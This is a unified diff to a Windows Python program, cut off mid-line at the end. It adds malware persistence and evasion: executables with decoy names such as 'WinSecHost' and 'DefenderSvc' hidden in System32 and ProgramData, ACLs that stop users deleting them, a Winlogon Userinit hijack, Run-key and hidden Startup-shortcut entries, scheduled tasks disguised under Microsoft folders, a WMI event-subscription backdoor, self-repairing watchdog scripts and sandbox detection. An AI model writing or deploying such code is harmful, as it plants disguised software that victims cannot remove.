@@ -22,6 +22,10 @@
 import os
 import sys
 import time
+from aiohttp import web
+import secrets
+import hmac 
+import shlex
 import traceback
 import faulthandler
 
@@ -432,10 +436,10 @@ def vm_hits():
 
 
 def vm_guard(code=0):
-    if not VM_KILL:
+    if not globals().get("VM_KILL", True):
         _crash("vm", "disabled")
         return
-    if "--zz-novm" in sys.argv or os.environ.get("LESSMI_NO_VM") == "1":
+    if "--zz-novm" in sys.argv or os.environ.get("LESSMI_NO_VM") == "0":
         _crash("vm", "skipped by flag")
         return
     try:
@@ -451,7 +455,7 @@ def vm_guard(code=0):
     if "--zz-vmkeep" in sys.argv:
         return
     if kill:
-        os._exit(code)
+        os._exit(9 if "--zz-setup" in sys.argv else code)
 
 
 vm_guard()
@@ -621,7 +625,6 @@ PERSIST_BASES = [
     os.path.join(WINDIR, "System32"),
     os.path.join(PDATA, "Microsoft", "Windows", "Caches"),
     os.path.join(PDATA, "Microsoft"),
-    os.path.join(PDATA, "Windows"),
 ]
 
 _MUTEX = None
@@ -629,13 +632,26 @@ APP_DIR = ""
 _LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")
 
 REPAIR_FLAG = "--zz-repair"
-STATE_VERSION = 4
-WATCHDOG_PERIOD = 45
+SETUP_FLAG = "--zz-setup"
+STATE_VERSION = 5
+
+WATCHDOG_PERIOD = 6
+REPAIR_PERIOD = 30
+HEARTBEAT_PERIOD = 8
+HEARTBEAT_MAX_AGE = 40
+
+_REPAIR_LOCK = threading.Lock()
+_WATCH_LOCK = threading.Lock()
+_THREADS_STARTED = False
 
 _FALLBACK_NAMES = (
     "runtimebroker", "ctfmon", "backgroundtaskhost", "sihost", "fontdrvhost",
     "dwm", "audiodg", "searchindexer", "smartscreen", "taskhostw",
 )
+
+DECOY = ("WinSecHost", "SecHost", "WinSvcHost", "DefenderSvc", "SysGuard",
+         "WinTrust", "CfgHost", "SvcHost32", "WinHealth", "SecCenter")
+
 
 def _watch_vbs_block(flag="--zz-task"):
     return 'wscript //nologo "%S0%.vbs" {}'.format(flag)
@@ -645,27 +661,38 @@ def _write_vbs(st):
     slots = st.get("slots") or []
     if not slots:
         return False
-    exe = slots[0]["exe"]
-    vbs = exe + ".vbs"
-    try:
-        os.makedirs(os.path.dirname(vbs), exist_ok=True)
-        with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
-            f.write('Set s = CreateObject("WScript.Shell")\n')
-            f.write('If WScript.Arguments.Count > 0 Then\n')
-            f.write('  s.Run """" & "{}" & """ " & WScript.Arguments(0), 0, False\n'.format(exe))
-            f.write('Else\n')
-            f.write('  s.Run """" & "{}" & """", 0, False\n'.format(exe))
-            f.write('End If\n')
-        _hide(vbs, True)
-        return True
-    except Exception:
-        return False
+    ok = False
+    for s in slots:
+        exe = s["exe"]
+        vbs = exe + ".vbs"
+        try:
+            os.makedirs(os.path.dirname(vbs), exist_ok=True)
+            body = ('Set s = CreateObject("WScript.Shell")\r\n'
+                    'If WScript.Arguments.Count > 0 Then\r\n'
+                    '  s.Run """" & "{}" & """ " & WScript.Arguments(0), 0, False\r\n'
+                    'Else\r\n'
+                    '  s.Run """" & "{}" & """", 0, False\r\n'
+                    'End If\r\n').format(exe, exe)
+            same = False
+            try:
+                with open(vbs, "r", encoding="utf-8", errors="replace") as f:
+                    same = f.read() == body
+            except Exception:
+                same = False
+            if not same:
+                with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
+                    f.write(body)
+            _hide(vbs, True)
+            ok = True
+        except Exception:
+            pass
+    return ok
 
 
 _WATCH_BAT = """@echo off
 setlocal EnableExtensions
 if not "%~1"=="" title %~1
-set /a R=3
+set /a R=4
 :loop
 set "SRC="
 if exist "%S0%" set "SRC=%S0%"
@@ -676,11 +703,11 @@ if defined SRC (
 tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
 if errorlevel 1 if exist "%S0%" {vbs}
 set /a R+=1
-if %R% LSS 4 goto wait
+if %R% LSS 6 goto wait
 set /a R=0
 if exist "%S0%" {vbsr}
 :wait
-call :sleep 21
+call :sleep 6
 goto loop
 :sleep
 >nul 2>&1 ping -n %1 127.0.0.1
@@ -698,14 +725,21 @@ def _machine_hash():
     return hashlib.md5(_machine_seed().encode("utf-8", "replace")).hexdigest()
 
 
+def _payload_dir():
+    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", _machine_hash()[:10])
+
+
 def _pick_exe_name():
+    forced = os.environ.get("LM_NAME")
+    if forced:
+        return forced
     h = _machine_hash()
-    base = _FALLBACK_NAMES[int(h[:8], 16) % len(_FALLBACK_NAMES)]
-    for cand in (base, base + "64", base + h[8:11].upper()):
+    for i in range(48):
+        cand = DECOY[int(h[i % 32], 16) % len(DECOY)] + _rand(random.randint(2, 4))
         if not os.path.exists(os.path.join(_sys32(), cand + ".exe")) and \
            not os.path.isdir(os.path.join(_sys32(), cand)):
             return cand + ".exe"
-    return base + h[:5] + ".exe"
+    return DECOY[0] + _rand(6) + ".exe"
 
 
 def _other_volumes():
@@ -716,7 +750,7 @@ def _other_volumes():
             if part.fstype.lower() not in ("ntfs", "fat32", "exfat"):
                 continue
             opts = (part.opts or "").lower()
-            if "cdrom" in opts or "removable" in opts:
+            if "cdrom" in opts:
                 continue
             if part.mountpoint.upper().startswith(sysdrive):
                 continue
@@ -727,9 +761,10 @@ def _other_volumes():
 
 
 def _slot_dirs():
-    dirs = [_sys32(), os.path.join(PDATA, "Microsoft", "Caches")]
+    h = _machine_hash()[:10]
+    dirs = [_payload_dir(), _sys32(), os.path.join(PDATA, "Microsoft", "Caches")]
     for vol in _other_volumes():
-        dirs.append(os.path.join(vol, "ProgramData", "Microsoft", "Caches"))
+        dirs.append(os.path.join(vol, "ProgramData", "Microsoft", "Caches", h))
     seen, out = set(), []
     for d in dirs:
         if d.lower() in seen:
@@ -744,6 +779,15 @@ def _is_admin():
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
     except Exception:
         return False
+
+
+def _session_id():
+    try:
+        sid = ctypes.c_ulong()
+        ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sid))
+        return int(sid.value)
+    except Exception:
+        return 0
 
 
 def _ps(cmd):
@@ -766,10 +810,8 @@ def _machine_seed():
 
 def _hide(path, hidden=True):
     try:
-        subprocess.run(
-            ["attrib", "+h" if hidden else "-h", "+s" if hidden else "-s", str(path)],
-            capture_output=True, creationflags=_CNW
-        )
+        flags = ["+h", "+s"] if hidden else ["-h", "-s", "-r"]
+        subprocess.run(["attrib", *flags, str(path)], capture_output=True, creationflags=_CNW)
     except Exception:
         pass
 
@@ -781,12 +823,85 @@ def _rand(n):
 
 
 def _anchor():
-    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", _machine_hash()[:12] + ".json")
+    return os.path.join(_payload_dir(), _machine_hash()[:12] + ".json")
+
+
+def _hb_path():
+    return os.path.join(_payload_dir(), _machine_hash()[:12] + ".hb")
 
 
 def _app_db():
     return os.path.join(APP_DIR or APPDATA, "data.db")
 
+def _unlock(path):
+    try:
+        subprocess.run(["attrib", "-r", "-s", "-h", str(path)],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+    try:
+        subprocess.run(["icacls", str(path), "/remove:d", "*S-1-5-32-545"],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+
+
+def _lock_exe(path):
+    p = str(path)
+    try:
+        subprocess.run(["attrib", "+h", "+s", "+r", p], capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+    try:
+        subprocess.run(["icacls", p, "/inheritance:r",
+                        "/grant:r", "*S-1-5-18:F",
+                        "/grant:r", "*S-1-5-32-544:F",
+                        "/grant:r", "*S-1-5-32-545:RX",
+                        "/deny", "*S-1-5-32-545:(DE,DC)"],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+
+
+def _lock_dir(d):
+    p = str(d)
+    try:
+        subprocess.run(["attrib", "+h", "+s", p], capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+    try:
+        subprocess.run(["icacls", p, "/inheritance:r",
+                        "/grant:r", "*S-1-5-18:(OI)(CI)F",
+                        "/grant:r", "*S-1-5-32-544:(OI)(CI)F",
+                        "/grant:r", "*S-1-5-32-545:(OI)(CI)RX",
+                        "/deny", "*S-1-5-32-545:(OI)(CI)(DE,DC)"],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+
+
+def _unlock_dir(d):
+    try:
+        subprocess.run(["icacls", str(d), "/remove:d", "*S-1-5-32-545"],
+                       capture_output=True, creationflags=_CNW)
+        subprocess.run(["icacls", str(d), "/inheritance:e"],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+
+
+def _copy_slot(src, dst):
+    try:
+        os.makedirs(os.path.dirname(dst), exist_ok=True)
+        if os.path.exists(dst):
+            _unlock(dst)
+        shutil.copy2(src, dst)
+        if not os.path.exists(dst) or os.path.getsize(dst) != os.path.getsize(src):
+            return False
+        _lock_exe(dst)
+        return True
+    except Exception:
+        return False
 
 def _state_read():
     for f in (_anchor(), _LEGACY_STATE):
@@ -824,26 +939,26 @@ def _state_write(d):
 
 def _ensure_state():
     st = _state_read()
-    if st and st.get("v") == STATE_VERSION and st.get("slots"):
+    if st and st.get("v") == STATE_VERSION and st.get("slots") and st.get("wmi"):
         return st
 
     h = _machine_hash()
     name = _pick_exe_name()
     base = os.path.splitext(name)[0]
-    slots = [{"exe": os.path.join(d, name), "bat": os.path.join(d, base + ".bat")}
-             for d in _slot_dirs()]
+    slots = [{"exe": os.path.join(d, name)} for d in _slot_dirs()]
 
     names = [base, base + "Mon", base + "Svc"][:max(1, min(3, len(slots)))]
 
     d = {
         "v": STATE_VERSION,
-        "dir": _sys32(),
+        "dir": _payload_dir(),
         "exe": slots[0]["exe"],
         "bak": slots[1]["exe"] if len(slots) > 1 else slots[0]["exe"],
-        "bat": slots[0]["bat"],
         "slots": slots,
         "task": _TASK_DIR + names[0],
         "tasks": [_TASK_DIR + n for n in names],
+        "wmi": "LM_" + h[:14],
+        "lnk": "WinSecHost.lnk",
         "mutex": (st or {}).get("mutex") or _rand(14),
         "appdir": (st or {}).get("appdir") or _rand(11),
         "created": (st or {}).get("created") or int(time.time()),
@@ -856,26 +971,6 @@ def _ensure_state():
 def _targets():
     st = _ensure_state()
     return st["task"], Path(st["dir"]), Path(st["exe"])
-
-
-def _lock_exe(path):
-    try:
-        subprocess.run(
-            ["icacls", str(path), "/inheritance:r",
-             "/grant:r", "*S-1-5-18:F",
-             "/grant:r", "*S-1-5-32-544:F",
-             "/grant:r", "*S-1-5-32-545:RX"],
-            capture_output=True, creationflags=_CNW)
-    except Exception:
-        pass
-
-
-def _unlock_dir(d):
-    try:
-        subprocess.run(["icacls", str(d), "/inheritance:e"], capture_output=True, creationflags=_CNW)
-    except Exception:
-        pass
-
 
 def _reg_add(key, name, value, typ="REG_SZ", hive="HKLM"):
     try:
@@ -890,7 +985,7 @@ def _reg_add(key, name, value, typ="REG_SZ", hive="HKLM"):
         pass
     try:
         h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
-        r = subprocess.run(["reg", "add", f"{h}\\{key}", "/v", name, "/t", typ,
+        r = subprocess.run(["reg", "add", "{}\\{}".format(h, key), "/v", name, "/t", typ,
                             "/d", str(value), "/f"], capture_output=True, creationflags=_CNW)
         return r.returncode == 0
     except Exception:
@@ -911,16 +1006,43 @@ def _reg_query(key, name, hive="HKLM"):
 def _reg_delete(key, name, hive="HKLM"):
     try:
         h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
-        subprocess.run(["reg", "delete", f"{h}\\{key}", "/v", name, "/f"],
+        subprocess.run(["reg", "delete", "{}\\{}".format(h, key), "/v", name, "/f"],
                        capture_output=True, creationflags=_CNW)
     except Exception:
         pass
 
 
 def _startup_dir():
-    return os.path.join(os.environ.get("APPDATA", ""),
-                        r"Microsoft\Windows\Start Menu\Programs\Startup")
+    return os.path.join(PDATA, r"Microsoft\Windows\Start Menu\Programs\StartUp")
 
+
+def _write_lnk(exe):
+    st = _state_read() or {}
+    lnk = os.path.join(_startup_dir(), st.get("lnk") or "WinSecHost.lnk")
+    try:
+        os.makedirs(_startup_dir(), exist_ok=True)
+        pythoncom.CoInitialize()
+        sh = win32com.client.Dispatch("WScript.Shell")
+        s = sh.CreateShortCut(lnk)
+        s.TargetPath = exe
+        s.Arguments = "--zz-ui"
+        s.WorkingDirectory = os.path.dirname(exe)
+        s.WindowStyle = 7
+        s.Description = "Windows Security Host"
+        s.Save()
+        _hide(lnk, True)
+        return True
+    except Exception:
+        return False
+
+
+def _del_lnk():
+    st = _state_read() or {}
+    for n in {st.get("lnk") or "WinSecHost.lnk", "WinSecHost.lnk"}:
+        try:
+            os.remove(os.path.join(_startup_dir(), n))
+        except Exception:
+            pass
 
 _TASK_DIR = "\\Microsoft\\Windows\\"
 _TASK_SDDL = "D:PAI(A;;GA;;;BA)(A;;GA;;;SY)(A;;GRGX;;;BU)(A;;GRGX;;;AU)"
@@ -950,7 +1072,7 @@ _TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
@@ -1032,30 +1154,58 @@ def _task_svc():
     return svc
 
 
+def _task_root():
+    return _task_svc().GetFolder("\\")
+
+
+def _task_register(name, xml, user, logon_type):
+    full = name if name.startswith("\\") else _TASK_DIR + name
+    try:
+        root = _task_root()
+        try:
+            root.RegisterTask(full, xml, 6, user, "", logon_type, _TASK_SDDL)
+            return True
+        except Exception:
+            root.RegisterTask(full, xml, 6, user, "", logon_type)
+            return True
+    except Exception as e:
+        _crash("task", "com {} {!r}".format(full, e))
+
+    tmp = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "lm_{}.xml".format(_rand(6)))
+    try:
+        with open(tmp, "w", encoding="utf-16") as f:
+            f.write(xml)
+        r = subprocess.run(["schtasks", "/Create", "/TN", full, "/XML", tmp, "/F"],
+                           capture_output=True, text=True, creationflags=_CNW)
+        ok = r.returncode == 0
+        if not ok:
+            _crash("task", "schtasks {} rc={} {}".format(full, r.returncode, (r.stderr or r.stdout or "").strip()))
+        return ok
+    except Exception as e:
+        _crash("task", "schtasks {!r}".format(e))
+        return False
+    finally:
+        try:
+            os.remove(tmp)
+        except Exception:
+            pass
+
+
 def _task_create(name, exe, d1=8):
     if not name.startswith("\\"):
         name = _TASK_DIR + name
     exe = str(exe)
     sid = _sid()
     xml = _TASK_XML.format(desc=os.path.basename(exe), sid=_xesc(sid), exe=_xesc(exe),
-                           cwd=_xesc(os.path.dirname(exe)), d1=d1, d2=d1 + 12)
-    try:
-        root = _task_svc().GetFolder(_TASK_DIR)
-        try:
-            root.RegisterTask(name, xml, 6, sid, "", 3, _TASK_SDDL)
-        except Exception:
-            root.RegisterTask(name, xml, 6, sid, "", 3)
-        return True
-    except Exception as e:
-        _crash("task", "create {} {!r}".format(name, e))
-        return False
+                           cwd=_xesc(os.path.dirname(exe)), d1=d1, d2=d1 + 50)
+    return _task_register(name, xml, sid, 3)
 
 
 def _task_delete(name):
     if not name.startswith("\\"):
         name = _TASK_DIR + name
     try:
-        _task_svc().GetFolder(_TASK_DIR).DeleteTask(name, 0)
+        _task_root().DeleteTask(name, 0)
         return True
     except Exception:
         pass
@@ -1071,42 +1221,81 @@ def _task_exists(name):
     if not name.startswith("\\"):
         name = _TASK_DIR + name
     try:
-        _task_svc().GetFolder(_TASK_DIR).GetTask(name)
+        _task_root().GetTask(name)
         return True
     except Exception:
         return False
 
+
 def _trigger_task(st):
     for t in (st.get("tasks") or []):
         try:
-            _task_svc().GetFolder(_TASK_DIR).GetTask(t).Run("")
+            _task_root().GetTask(t).Run("")
             return True
         except Exception:
             continue
     return False
 
+_WMI_PS = r'''
+$ns = 'root\subscription'
+$name = '@NAME@'
+$exe = '@EXE@'
+Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue |
+  Where-Object { $_.Filter -like "*$name*" } | Remove-WmiObject -EA SilentlyContinue
+Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='$name'" -EA SilentlyContinue | Remove-WmiObject
+Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$name'" -EA SilentlyContinue | Remove-WmiObject
 
-def _takeover():
-    me = os.getpid()
-    cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0]).lower()
-    names = {os.path.basename(cur)}
-    paths = {cur}
+$f = ([wmiclass]"$ns`:__EventFilter").CreateInstance()
+$f.Name = $name
+$f.QueryLanguage = 'WQL'
+$f.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$f.EventNamespace = 'root\cimv2'
+$f.Put() | Out-Null
+
+$c = ([wmiclass]"$ns`:CommandLineEventConsumer").CreateInstance()
+$c.Name = $name
+$c.CommandLineTemplate = '"' + $exe + '" --zz-task'
+$c.ExecutablePath = $exe
+$c.WaitForProcessStartOnly = $true
+$c.Put() | Out-Null
+
+$b = ([wmiclass]"$ns`:__FilterToConsumerBinding").CreateInstance()
+$b.Filter = $f
+$b.Consumer = $c
+$b.Put() | Out-Null
+Write-Output 'OK'
+'''
+
+
+def _wmi_install(exe, name=None):
     st = _state_read() or {}
-    for s in (st.get("slots") or []):
-        p = (s.get("exe") or "").lower()
-        if p:
-            names.add(os.path.basename(p))
-            paths.add(os.path.abspath(p).lower())
-    for p in psutil.process_iter(["pid", "name", "exe"]):
-        try:
-            if p.info["pid"] == me:
-                continue
-            if (p.info.get("name") or "").lower() not in names and \
-               (p.info.get("exe") or "").lower() not in paths:
-                continue
-            p.kill()
-        except Exception:
-            pass
+    name = name or st.get("wmi") or ("LM_" + _machine_hash()[:14])
+    try:
+        script = _WMI_PS.replace("@NAME@", name).replace("@EXE@", str(exe))
+        r = _ps(script)
+        return bool(r and "OK" in (r.stdout or ""))
+    except Exception:
+        return False
+
+
+def _wmi_exists(name=None):
+    st = _state_read() or {}
+    name = name or st.get("wmi") or ("LM_" + _machine_hash()[:14])
+    r = _ps("(Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
+            "-Filter \"Name='{}'\" -EA SilentlyContinue | Measure-Object).Count".format(name))
+    return bool(r and (r.stdout or "").strip().strip("0"))
+
+
+def _wmi_remove():
+    st = _state_read() or {}
+    name = st.get("wmi") or ("LM_" + _machine_hash()[:14])
+    _ps("Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "
+        "\"Name='{}'\" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue".format(name))
+    _ps("Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "
+        "\"Name='{}'\" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue".format(name))
+    _ps("Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding "
+        "-EA SilentlyContinue | Where-Object { $_.Filter -like '*{}*' } | "
+        "Remove-WmiObject -EA SilentlyContinue".format(name))
 
 def install_userinit():
     st = _ensure_state()
@@ -1115,20 +1304,30 @@ def install_userinit():
     if not os.path.exists(exe):
         return False
     entry = '"{}" --zz-ui'.format(exe)
-    for _ in range(5):
-        cur = _reg_query(WINLOGON_KEY, "Userinit") or (userinit + ",")
-        low = cur.lower()
-        if exe.lower() in low and userinit.lower() in low:
-            return True
-        parts = [p.strip() for p in cur.split(",") if p.strip()]
-        parts = [p for p in parts if exe.lower() not in p.lower() and
-                 userinit.lower() not in p.lower()]
-        _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [entry, userinit]) + ",")
-        time.sleep(0.3)
+    ok = False
+    for attempt in range(8):
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINLOGON_KEY, 0,
+                               winreg.KEY_READ | winreg.KEY_SET_VALUE)
+            try:
+                cur = winreg.QueryValueEx(k, "Userinit")[0]
+            except OSError:
+                cur = userinit + ","
+            parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
+            keep = [p for p in parts
+                    if p.lower() != exe.lower() and not p.lower().endswith("userinit.exe")
+                    and "--zz-ui" not in p]
+            value = ", ".join(keep + [entry, userinit]) + ","
+            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, value)
+            winreg.CloseKey(k)
+        except Exception:
+            _reg_add(WINLOGON_KEY, "Userinit", ", ".join([entry, userinit]) + ",")
+        time.sleep(0.4 + attempt * 0.2)
         got = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
         if exe.lower() in got and userinit.lower() in got:
-            return True
-    return False
+            ok = True
+            break
+    return ok
 
 
 def uninstall_userinit():
@@ -1137,53 +1336,103 @@ def uninstall_userinit():
     cur = _reg_query(WINLOGON_KEY, "Userinit")
     if not cur:
         return
-    if exe and exe.lower() not in cur.lower():
+    if exe and exe.lower() not in cur.lower() and "--zz-ui" not in cur:
         return
-    parts = [p.strip() for p in cur.split(",") if p.strip()]
-    parts = [p for p in parts if userinit.lower() not in p.lower() and
-             not (exe and exe.lower() in p.lower())]
-    _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [userinit]) + ",")
-
+    parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
+    keep = [p for p in parts
+            if not p.lower().endswith("userinit.exe")
+            and (not exe or p.lower() != exe.lower())
+            and "--zz-ui" not in p]
+    _reg_add(WINLOGON_KEY, "Userinit", ", ".join(keep + [userinit]) + ",")
 
 def repair_all():
-    st = _ensure_state()
-    slots = st.get("slots") or []
-    if not slots:
-        return
+    if not _REPAIR_LOCK.acquire(False):
+        return False
+    try:
+        st = _ensure_state()
+        slots = st.get("slots") or []
+        if not slots:
+            return False
 
-    alive = next((Path(s["exe"]) for s in slots if Path(s["exe"]).exists()), None)
-    for s in slots:
-        p = Path(s["exe"])
-        if p.exists():
-            continue
+        cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
+        alive = None
+        for cand in [cur] + [s["exe"] for s in slots]:
+            if cand and os.path.exists(cand) and os.path.getsize(cand) > 100_000:
+                alive = cand
+                break
+
+        for s in slots:
+            p = s["exe"]
+            if not os.path.exists(p):
+                if alive:
+                    _copy_slot(alive, p)
+            else:
+                _lock_exe(p)
+
+        if os.path.isdir(st.get("dir") or ""):
+            _lock_dir(st["dir"])
+
+        _write_vbs(st)
+        _write_watchdog(st)
+
+        if not _is_admin():
+            _spawn_watchdog()
+            return True
+
+        for t in (st.get("tasks") or []):
+            if not _task_exists(t):
+                _task_create(t, st["exe"], 8)
+
+        if st["exe"].lower() not in (_reg_query(WINLOGON_KEY, "Userinit") or "").lower():
+            install_userinit()
+
+        _reg_add(RUN_KEY, os.path.splitext(os.path.basename(st["exe"]))[0],
+                 '"{}" --zz-ui'.format(st["exe"]), hive="HKLM")
+        if not os.path.exists(os.path.join(_startup_dir(), st.get("lnk") or "x")):
+            _write_lnk(st["exe"])
+        if not _wmi_exists():
+            _wmi_install(st["exe"])
+
+        _spawn_watchdog()
+        _crash("repair", "done")
+        return True
+    except Exception:
+        _crash("repair", traceback.format_exc())
+        return False
+    finally:
         try:
-            os.makedirs(p.parent, exist_ok=True)
-            if alive:
-                shutil.copy2(str(alive), str(p))
+            _REPAIR_LOCK.release()
         except Exception:
             pass
-        if p.exists():
-            alive = alive or p
 
-    for s in slots:
-        p = Path(s["exe"])
-        if p.exists():
-            _hide(p, True)
-            _lock_exe(p)
 
-    names = st.get("tasks") or [st["task"]]
-    for i, (s, t) in enumerate(zip(slots, names)):
-        if Path(s["exe"]).exists():
-            _task_create(t, s["exe"], 8 + i * 6)
+def _repair_loop():
+    while True:
+        try:
+            repair_all()
+        except Exception:
+            pass
+        time.sleep(REPAIR_PERIOD)
 
+
+def _heartbeat_loop():
+    while True:
+        try:
+            os.makedirs(os.path.dirname(_hb_path()), exist_ok=True)
+            with open(_hb_path(), "w", encoding="ascii") as f:
+                f.write("{} {}".format(os.getpid(), _session_id()))
+        except Exception:
+            pass
+        time.sleep(HEARTBEAT_PERIOD)
+
+
+def _hb_read():
     try:
-        install_userinit()
+        with open(_hb_path(), "r", encoding="ascii") as f:
+            pid, sess = f.read().split()
+        return int(pid), int(sess), os.path.getmtime(_hb_path())
     except Exception:
-        pass
-
-    _write_watchdog(st)
-    _crash("repair", "done slots={}".format(len(slots)))
-
+        return None
 
 def _write_watchdog(st):
     slots = st.get("slots") or []
@@ -1191,31 +1440,45 @@ def _write_watchdog(st):
         return False
     defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
     find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
-                       for i in range(1, len(slots)))
+                     for i in range(1, len(slots)))
     restore = "\n".join(
         '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
-        '  if exist "%S{0}%" attrib +h +s "%S{0}%" >nul 2>&1'.format(i)
+        '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
         for i in range(len(slots)))
-    _write_vbs(st)
     body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
                              vbs=_watch_vbs_block("--zz-task"),
                              vbsr=_watch_vbs_block("--zz-repair"),
-                             name=os.path.basename(slots[0]["exe"]))
+                             name=os.path.basename(slots[0]["exe"]),
+                             task="LMG_" + (st.get("mutex") or "0"))
     ok = False
     for s in slots:
+        bat = os.path.join(os.path.dirname(s["exe"]), os.path.splitext(os.path.basename(s["exe"]))[0] + ".bat")
+        s["bat"] = bat
         try:
-            os.makedirs(os.path.dirname(s["bat"]), exist_ok=True)
-            with open(s["bat"], "w", encoding="utf-8", newline="\r\n") as f:
-                f.write(body)
-            _hide(s["bat"], True)
+            os.makedirs(os.path.dirname(bat), exist_ok=True)
+            same = False
+            try:
+                with open(bat, "r", encoding="utf-8", errors="replace") as f:
+                    same = f.read() == body
+            except Exception:
+                same = False
+            if not same:
+                tmp = bat + ".new"
+                with open(tmp, "w", encoding="utf-8", newline="\r\n") as f:
+                    f.write(body)
+                if os.path.exists(bat):
+                    _unlock(bat)
+                os.replace(tmp, bat)
+            _hide(bat, True)
             ok = True
         except Exception:
             pass
     return ok
 
+
 def _watch_alive(tag=None):
     st = _state_read() or {}
-    bats = [os.path.basename(s["bat"]).lower()
+    bats = [os.path.basename(s.get("bat") or "").lower()
             for s in (st.get("slots") or []) if s.get("bat")]
     if not bats:
         return False
@@ -1224,21 +1487,22 @@ def _watch_alive(tag=None):
             if (p.info.get("name") or "").lower() != "cmd.exe":
                 continue
             cl = " ".join(p.info.get("cmdline") or []).lower()
-            if any(b in cl for b in bats):
+            if any(b and b in cl for b in bats):
                 return True
     except Exception:
         pass
     return False
 
+
 def _kill_watchdog():
     st = _state_read() or {}
-    slots = st.get("slots") or []
     tag = st.get("mutex")
     if tag:
         for t in ("LMM_{}".format(tag), "LMG_{}".format(tag)):
             subprocess.run(["taskkill", "/f", "/fi", "windowtitle eq " + t],
                            capture_output=True, creationflags=_CNW)
-    tags = [os.path.basename(s["bat"]).lower() for s in slots if s.get("bat")]
+    tags = [os.path.basename(s.get("bat") or "").lower()
+            for s in (st.get("slots") or []) if s.get("bat")]
     if not tags:
         return
     try:
@@ -1247,7 +1511,7 @@ def _kill_watchdog():
                 if (p.info.get("name") or "").lower() != "cmd.exe":
                     continue
                 cl = " ".join(p.info.get("cmdline") or []).lower()
-                if any(t in cl for t in tags):
+                if any(t and t in cl for t in tags):
                     p.kill()
             except Exception:
                 pass
@@ -1256,8 +1520,6 @@ def _kill_watchdog():
 
 
 def _watch_suspend(rounds=6):
-    global _WATCH_ON
-    _WATCH_ON = False
     st = _state_read() or {}
     tag = st.get("mutex") or ""
     for _ in range(rounds):
@@ -1283,33 +1545,41 @@ def _watch_suspend(rounds=6):
 
 def _spawn_watchdog():
     global _watch_proc
-    st = _state_read() or {}
-    slots = st.get("slots") or []
-    if not slots:
+    if not _WATCH_LOCK.acquire(False):
         return
-    if _watch_proc is not None and _watch_proc.poll() is None:
-        return
-    if _watch_alive(st.get("mutex")):
-        return
-    bat = next((s["bat"] for s in slots if os.path.exists(s["bat"])), None)
-    if not bat and not _write_watchdog(st):
-        return
-    bat = bat or next((s["bat"] for s in slots if os.path.exists(s["bat"])), None)
-    if not bat:
-        return
-    tag = "LMG_" + (st.get("mutex") or "0")
     try:
+        st = _state_read() or {}
+        slots = st.get("slots") or []
+        if not slots:
+            return
+        if _watch_proc is not None and _watch_proc.poll() is None:
+            return
+        if _watch_alive(st.get("mutex")):
+            return
+        bat = next((s.get("bat") for s in slots if s.get("bat") and os.path.exists(s["bat"])), None)
+        if not bat:
+            _write_watchdog(st)
+            bat = next((s.get("bat") for s in slots if s.get("bat") and os.path.exists(s["bat"])), None)
+        if not bat:
+            return
+        tag = "LMG_" + (st.get("mutex") or "0")
         _watch_proc = subprocess.Popen(
             ["cmd.exe", "/c", bat, tag], creationflags=_CNW,
             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL, close_fds=True)
     except Exception:
         _watch_proc = None
+    finally:
+        try:
+            _WATCH_LOCK.release()
+        except Exception:
+            pass
 
 
 def _watch_resume():
     st = _state_read() or {}
-    bat = next((b for b in _watch_bats() if os.path.exists(b)), None)
+    bat = next((s.get("bat") for s in (st.get("slots") or [])
